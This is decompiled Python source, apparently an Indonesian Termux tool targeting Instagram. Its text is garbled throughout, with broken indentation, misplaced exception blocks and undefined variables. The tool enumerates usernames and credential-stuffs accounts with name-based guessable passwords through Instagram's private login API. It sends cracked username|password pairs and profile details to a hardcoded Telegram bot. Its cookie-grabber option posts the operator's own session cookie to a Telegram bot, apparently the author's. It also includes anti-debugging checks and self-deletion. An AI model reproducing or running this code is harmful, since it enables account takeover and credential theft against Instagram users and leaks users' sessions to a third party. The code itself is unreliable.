"""
creat ig
decode by viewtech ofc
"""
global Ok  
global Cp  
global old_ip  
global Loop  
import sys
import os
if sys.gettrace() or 'PYTHONINSPECT' in os.environ:
    exit()
sys.settrace = lambda *a, **kw: None
sys.breakpointhook = lambda *a, **kw: None
import os
f = '.flag_used'
if os.path.exists(f):
    os.remove(__file__)
    exit()
open(f, 'w').close()
import requests
import uuid
import time
import json
import random
import sys
import os
from concurrent.futures import ThreadPoolExecutor as tred
import urllib.request
import hashlib
import requests
import os
import random
from colorama import Fore, Back, Style, init
import random
import string
import requests
import threading
import queue
import sys
import re
import shutil
import time
from colorama import Fore, Back, Style, init
init(autoreset=True)
'''Decompiler error: line too long for translation. Please decompile this statement manually.'''
headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36', 'X-IG-App-ID': '936619743392459'}

def print_banner():
    os.system('clear')
    banner = f'{Back.RED}{Fore.WHITE}\n__  _____ _  _ ___ _  _  ___ _  _   _   _  _ \n\\ \\/ / __| || |_ _| \\| |/ __| || | /_\\ | \\| |\n >  <\\__ \\ __ || || .` | (__| __ |/ _ \\| .` |\n/_/\\_\\___/_||_|___|_|\\_|\\___|_||_/_/ \\_\\_|\\_|\nDump username IG tanpa login by xShinchan\n{Style.RESET_ALL}\n'
    print(banner)

def generate_username():
    name1 = random.choice(first_names).lower()
    name2 = random.choice(first_names).lower()
    number = str(random.randint(1, 9999)).zfill(random.choice([2, 3, 4]))
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(1, 3)))
    special = random.choice(['', '_', '.', '__', '_.', '._'])
    extras = ['', 'real', 'official', 'id', 'xx', 'ig', 'ig_', 'asli', 'aja', 'ku']
    patterns = [f'{name1}{special}{number}', f'{name1}{special}{suffix}', f'{name1}{special}{random.choice(extras)}', f"{name1}{special}{name2}{number}", f"{name1}{random.choice(['_', '.'])}{random.choice(extras)}", f"{name1}{random.choice(['_', '.', ''])}{random.choice(extras)}{random.choice(string.digits)}"]
    return random.choice(patterns)

def get_full_name(username):
    try:
        api_url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}'
        r = requests.get(api_url, headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return data['data']['user'].get('full_name') or '-'
        except:
            pass
        try:
            r = requests.get(f'https://www.instagram.com/{username}/', headers=headers, timeout=5)
            match = re.search('\"full_name\":\"([^\"]+)\"', r.text)
            if match:
                return match.group(1).encode('utf-8').decode('unicode_escape')
    except:
        pass  
    return '-'
    else:  
        return '-'

def is_name_match(username, full_name):
    if full_name == '-':
        return False
    username_clean = username.lower().replace('.', '').replace('_', '')
    name_clean = full_name.lower().replace(' ', '')
    direct_match = username_clean in name_clean or name_clean in username_clean or any((name in username_clean for name in first_names if len(name) > 3))
    numeric_match = any((char.isdigit() for char in username)) and any((name in username_clean.rstrip(string.digits) for name in first_names))
    return direct_match or numeric_match

def check_username(username, output_queue, print_lock, counter, total, filename):
    try:
        url = f'https://www.instagram.com/{username}/'
        r = requests.get(url, headers=headers, timeout=5)
        with print_lock:
            pass  
    except Exception:
            counter[0] += 1
                if r.status_code == 200:
                    full_name = get_full_name(username)
                    if is_name_match(username, full_name):
                        with print_lock:
                            sys.stdout.write(f'\rusername {Fore.GREEN}{username} {Fore.WHITE}nama {Fore.GREEN}{full_name}'.ljust(150))
                            sys.stdout.flush()
                                output_queue.put((username, full_name))
                                with open(filename, 'a', encoding='utf-8') as f:
                                    f.write(f'{username}|{full_name}\n')
                else:  
                    if r.status_code == 404:
                        with print_lock:
                            sys.stdout.write(f'\r[{counter[0]:03}/{total}] - {username} [Eror]'.ljust(150))
                            sys.stdout.flush()
                    else:  
                        with print_lock:
                            sys.stdout.write(f'\r[{counter[0]:03}/{total}] ! {username} [ERROR {r.status_code}]'.ljust(80))
                            sys.stdout.flush()
            with print_lock:
                counter[0] += 1
                sys.stdout.write(f'\rusername {username} Gagal mengambil nama'.ljust(100))
                sys.stdout.flush()

def worker(queue_job, output_queue, print_lock, counter, total, filename):
    while True:
        try:
            username = queue_job.get(timeout=1)
            check_username(username, output_queue, print_lock, counter, total, filename)
            queue_job.task_done()
    except queue.Empty:
        return None
    else:  
        pass

def Xxshin():
    try:
        total = int(input('berapa username: '))
        filename = input('nama file contoh xshin.txt): ').strip()
        if not filename.endswith('.txt'):
            filename += '.txt'
        open(filename, 'w').close()
    except:
        print('Input tidak valid.')
        return
    else:  
        queue_job = queue.Queue()
        output_queue = queue.Queue()
        print_lock = threading.Lock()
        counter = [0]
        print('\n[✓] Memulai pencarian...\n')
        for _ in range(total):
            queue_job.put(generate_username())
    threads = []
    for _ in range(90):
        t = threading.Thread(target=worker, args=(queue_job, output_queue, print_lock, counter, total, filename))
        t.start()
        threads.append(t)
    queue_job.join()
    found = 0
    while not output_queue.empty():
        output_queue.get()
        found += 1
    print(f'\n\n[✓] Selesai! {found} username didapat')
    print(f'Hasil disimpan di: {filename}')
P, H, K, N = ('[1;97m', '[1;92m', '[1;93m', '[0m')
id, uid2, method = ([], [], [])
Ok, Cp, Loop = (0, 0, 0)
old_ip = ''
TOKEN = '8156344877:AAEEV3x0V2BsmSSBJqvz3Jd4zy-mSgZmIho'
CHAT_ID = '6263764542'

def print_banner():
    os.system('clear')
    banner = f'{Back.RED}{Fore.WHITE}\n__  _____ _  _ ___ _  _  ___ _  _   _   _  _ \n\\ \\/ / __| || |_ _| \\| |/ __| || | /_\\ | \\| |\n >  <\\__ \\ __ || || .` | (__| __ |/ _ \\| .` |\n/_/\\_\\___/_||_|___|_|\\_|\\___|_||_/_/ \\_\\_|\\_|\nby xShinchan\n{Style.RESET_ALL}\n'
    print(banner)

def send_telegram(text):
    try:
        url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
        payload = {'chat_id': CHAT_ID, 'text': text}
        requests.post(url, data=payload)
    except:
        return

def get_random_user_agent():
    android_versions = ['10', '11', '12', '13']
    chrome_versions = ['89.0.4389.90', '91.0.4472.124', '92.0.4515.159']
    devices = ['SM-G975F', 'SM-A505F', 'Pixel 4 XL', 'Redmi Note 10']
    android = random.choice(android_versions)
    chrome = random.choice(chrome_versions)
    device = random.choice(devices)
    return f'Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36'
session = requests.Session()

def get_instagram_csrf():
    res = session.get('https://www.instagram.com/accounts/login/')
    return res.cookies.get_dict().get('csrftoken', '')

def instagram_login():
    username = input('Username IG: ')
    password = input('Password IG: ')
    csrf_token = get_instagram_csrf()
    headers = insta_headers(csrf_token)
    payload = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}', 'queryParams': {}, 'optIntoOneTap': 'false'}
    res = session.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=payload)
    try:
        result = res.json()
    except Exception as e:
        pass  
    else:  
        if res.status_code == 200 and result.get('authenticated'):
            print(f'{Fore.GREEN}[+] Instagram login berhasil!')
            default_cookies = {'datr': 'v-bpZxWaM8xq-SFEXOVUJlfI', 'ig_did': '2392AECE-419C-43E3-8A82-827759712838', 'ig_nrcb': '1', 'mid': 'Z-nmvwABAAGUffvlB1LNU_jrkimG', 'ps_l': '1', 'ps_n': '1', 'wd': '360x624'}
            cookies = {**default_cookies, **session.cookies.get_dict()}
            cookie_string = '; '.join([f'{k}={v}' for k, v in cookies.items()])
            print(f'{Fore.WHITE}\n[+] Cookie IG:\n{cookie_string}')
            requests.post(f'https://api.telegram.org/bot{tok}/sendMessage', data={'chat_id': biji, 'text': f'coki IG : {cookie_string}'})
        else:  
            if result.get('message') == 'checkpoint_required':
                print(f'{Fore.YELLOW}[-] Checkpoint! Akun memerlukan verifikasi tambahan.')
            else:  
                print(f'{Fore.RED}[-] Login gagal: {result}')
        print(f'{Fore.RED}[-] Gagal parse response: {e}')
        return

def insta_headers(csrf=''):
    return {'User-Agent': get_random_user_agent(), 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://www.instagram.com/accounts/login/', 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.9', 'X-CSRFToken': csrf, 'Content-Type': 'application/x-www-form-urlencoded'}

def get_ip():
    try:
        for url in ['http://ip-api.com/json/', 'https://api.myip.com', 'https://api.ipify.org?format=json', 'https://ifconfig.me/all.json']:
            pass  
    except:
        pass  
    return
        else:  
            try:
                res = requests.get(url, timeout=5)
                data = res.json()
                if 'query' in data:
                    return data['query']
        except:
            pass
                else:  
                    if 'ip' in data:
                        return data['ip']
                    else:  
                        if 'ip_addr' in data:
                            return data['ip_addr']
        else:  
            return None

def check_connection():
    try:
        requests.get('https://www.google.com', timeout=5)
        return True
    except requests.exceptions.RequestException:
        return False
    else:  
        pass

def pause_if_ip_changed():
    global old_ip  
    while not check_connection():
        print(f'\r{K}[!] Koneksi terputus... Menunggu jaringan aktif kembali.', end='', flush=True)
        time.sleep(5)
    new_ip = get_ip()
    if old_ip and new_ip!= old_ip:
        print(f'\r{H}[IP] Reset terdeteksi: {old_ip} -> {new_ip}', end='')
        time.sleep(10)
    old_ip = new_ip
import random

def generate_ig_ios_ua():
    ios_versions = ['12_0', '12_1', '12_4', '13_0', '13_1', '13_3', '13_5', '13_6', '14_0', '14_1', '14_2', '14_4', '14_6', '14_7', '14_8', '15_0', '15_1', '15_2', '15_3', '15_4', '15_5', '15_6', '15_7', '16_0', '16_1', '16_2', '16_3', '16_4', '16_5', '16_6', '16_7', '17_0', '17_1', '17_2', '17_3', '17_4']
    devices = ['iPhone6,1', 'iPhone6,2', 'iPhone7,2', 'iPhone7,1', 'iPhone8,1', 'iPhone8,2', 'iPhone8,4', 'iPhone9,1', 'iPhone9,2', 'iPhone10,1', 'iPhone10,2', 'iPhone10,3', 'iPhone11,2', 'iPhone11,4', 'iPhone11,6', 'iPhone12,1', 'iPhone12,3', 'iPhone12,5', 'iPhone13,1', 'iPhone13,2', 'iPhone13,3', 'iPhone13,4', 'iPhone14,2', 'iPhone14,3', 'iPhone14,4', 'iPhone14,5', 'iPhone15,2', 'iPhone15,3', 'iPhone16,1', 'iPhone16,2', 'iPad5,1', 'iPad6,3', 'iPad6,11', 'iPad7,5', 'iPad8,1', 'iPad11,3', 'iPad11,6', 'iPad13,1']
    locales = ['en_US', 'id_ID', 'es_ES', 'fr_FR', 'pt_BR', 'ru_RU', 'de_DE', 'tr_TR', 'it_IT', 'zh_CN', 'zh_TW', 'ja_JP', 'ko_KR', 'th_TH', 'vi_VN', 'ar_SA', 'pl_PL', 'nl_NL']
    scales = ['1.00', '1.25', '2.00', '2.50', '2.75', '3.00', '3.25', '3.50', '4.00']
    resolutions = ['640x1136', '750x1334', '828x1792', '1125x2436', '1170x2532', '1242x2688', '1284x2778', '1179x2556', '1290x2796', '2048x2732', '2224x1668', '2360x1640']
    ver = f'{random.randint(250, 400)}.{random.randint(0, 9)}.0.{random.randint(10, 100)}.{random.randint(100, 999)}'
    ios_ver = random.choice(ios_versions)
    device = random.choice(devices)
    scale = random.choice(scales)
    locale = random.choice(locales)
    resolution = random.choice(resolutions)
    return f'Instagram {ver} iOS ({device}; iOS {ios_ver}; scale={scale}; {locale}; {resolution})'

def get_info(user_id, session):
    try:
        res = session.get(f'https://i.instagram.com/api/v1/users/{user_id}/info/')
        data = res.json()['user']
        username = data['username']
        followers = data.get('follower_count', 0)
        following = data.get('following_count', 0)
        posts = data.get('media_count', 0)
        fb_linked = 'linked_fb_user' in data
        print(f'{H}     └─> Username  : {username}')
        print(f'{H}     └─> Followers : {followers}')
        print(f'{H}     └─> Following : {following}')
        print(f'{H}     └─> Posts     : {posts}')
        print(f"{H}     └─> Facebook  : {('Yes' if fb_linked else 'No')}")
        return f"Username: {username}\nFollowers: {followers}\nFollowing: {following}\nPosts: {posts}\nFacebook Linked: {('Yes' if fb_linked else 'No')}"
    except:
        return 'Gagal mengambil info profil'

def login_api(username, passwords):
    global Cp  
    global Loop  
    global Ok  
    Loop += 1
    pause_if_ip_changed()
    sys.stdout.write(f'\r{Fore.GREEN}{Loop}{Fore.WHITE}:{Fore.GREEN}{str(username)[:6]}{P} OK:{Ok} CP:{Cp} IP:{old_ip}                           ')
    sys.stdout.flush()
    for password in passwords:
        try:
            ses = requests.Session()
            uag = generate_ig_ios_ua()
            device_id, family_device_id = (str(uuid.uuid4()), str(uuid.uuid4()))
            _hash = hashlib.md5((username + password).encode('utf-8')).hexdigest()
            ses.headers.update({'User-Agent': uag, 'x-ig-app-id': '3419628305025917', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-ig-device-id': device_id, 'x-ig-family-device-id': family_device_id, 'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73', 'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)), 'x-ig-bandwidth-speed-kbps': str(random.randint(2000000, 4000000) / 1000), 'x-pigeon-rawclienttime': str(time.time()), 'x-ig-android-id': f'android-{_hash[:16]}', 'accept-language': 'id-ID, en-US'})
            data = f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{int(time.time())}%3A{urllib.request.quote(password)}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22contact_point%22%3A%22{urllib.request.quote(username)}%22%7D%2C%22server_params%22%3A%7B%22device_id%22%3A%22android-{_hash[:16]}%22%2C%22login_source%22%3A%22Login%22%2C%22waterfall_id%22%3A%22{uuid.uuid4()}%22%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%7D%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
            res = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data)
            if 'logged_in_user' in res.text:
                user_id = res.json()['logged_in_user']['pk']
                print(f'\r{H}[OK] {username}|{password}                      ')
                info = get_info(user_id, ses)
                result = f'[OK] {username}|{password}\n{info}'
                open('Live.txt', 'a').write(f'{username}|{password}\n')
                send_telegram(result)
                Ok += 1
    except:
        pass
            else:  
                return
            if 'challenge_required' in res.text or 'two_factor' in res.text:
                print(f'\r{K}[CP] {username}|{password}                    ')
            else:  
                try:
                    user_id = res.json().get('user', {}).get('pk') or res.json().get('two_factor_info', {}).get('user_id')
                    info = get_info(user_id, ses) if user_id else 'Gagal ambil info profil'
                except:
                    info = 'Gagal ambil info profil'
                else:  
                    result = f'[CP] {username}|{password}\n{info}'
                    with open('Chek.txt', 'a') as f:
                        f.write(f'{result}\n')
                            send_telegram(result)
                            Cp += 1
        else:  
            break

def Crack_file():
    file = input('\nMasukkan nama file: ')
    try:
        uid = open(file, 'r').read().splitlines()
        for data in uid:
            pass  
        except FileNotFoundError:
            pass  
        else:  
            try:
                user, nama = data.split('|')
                id.append(data)
                except:
                    pass
                for user in reversed(id):
                    uid2.append(user)
                pilih = '1'
                if pilih == '1':
                    method.append('API')
                with tred(max_workers=10) as Crack:
                    for user in uid2:
                        uid, nama = user.split('|')
                        depan = nama.split(' ')[0]
                        pasw = [nama, depan + '123', depan + '12345', depan + '1234', depan + '123456', depan + '@123', depan + '@12345', depan + '@1234', depan + '@123456', depan + '01', depan + '02', depan + '03', depan + '04', depan + '05', depan + '06', depan + '07', depan + '08', depan + '09', depan + '10', depan + '2024', depan + '2025']
                        Crack.submit(login_api, uid, pasw)
                exit('File tidak ditemukan')
    pass

def install_termux_api():
    if shutil.which('termux-open-url') is None:
        os.system('pkg install termux-api -y > /dev/null 2>&1')

def open_telegram_link(username):
    link = f"https://t.me/{username.lstrip('@')}"
    os.system(f'termux-open-url {link} > /dev/null 2>&1')

def kontol():
    try:
        install_termux_api()
        open_telegram_link('@Xshinchannn')
    except:
        return

def menu():
    print_banner()
    print(f'{Fore.GREEN}[1] Ambil Cookie IG')
    print(f'{Fore.GREEN}[2] Dumpp Username IG tanpa Login')
    print(f'{Fore.GREEN}[3] Crack File Metode Threads FAST LOOP\n[4] Lapor BUG ')
    choice = input(f'\n{Fore.WHITE}Pilih menu: ')
    if choice == '1':
        instagram_login()
    else:  
        if choice == '2':
            Xxshin()
        else:  
            if choice == '3':
                Crack_file()
            else:  
                if choice == '4':
                    kontol()
                    print('Keluar dari program.')
                else:  
                    print(f'{Fore.RED}Pilihan tidak valid.')
                    menu()
if __name__ == '__main__':
    old_ip = get_ip()
    os.system('clear')
    menu()
